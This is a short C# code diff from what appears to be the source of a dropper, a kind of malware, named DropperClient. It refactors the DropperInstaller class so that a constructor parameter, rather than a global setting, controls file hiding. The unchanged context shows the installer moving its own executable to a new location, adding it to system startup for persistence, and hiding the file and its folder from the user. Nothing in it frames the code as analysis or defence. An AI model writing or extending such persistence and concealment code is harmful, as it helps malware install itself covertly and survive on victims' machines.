@@ -11,6 +11,8 @@ namespace DropperClient.Installation
 
         private readonly ExecutableInfo runningAssembly;
 
+        private readonly bool Hide;
+
         /// <summary>
         /// Provides functions to install the dropper client
         /// </summary>
@@ -18,6 +20,7 @@ namespace DropperClient.Installation
         /// <param name="installLocation">Directory to install the dropper client to</param>
         public DropperInstaller(bool hideFile, InstallLocation installLocation)
         {
+            Hide = hideFile;
             _installLocation = installLocation;
             runningAssembly = new ExecutableInfo();
         }
@@ -39,7 +42,7 @@ namespace DropperClient.Installation
                 runningAssembly.Move(targetExecutablePath);
                 startupManager.AddToStartup(runningAssembly.AssemblyName, targetExecutablePath);
 
-                if (Settings.Hide)
+                if (Hide)
                 {
                     var fInfo = new FileInfo(targetExecutablePath);
                     var dInfo = new FileInfo(targetFolderPath);
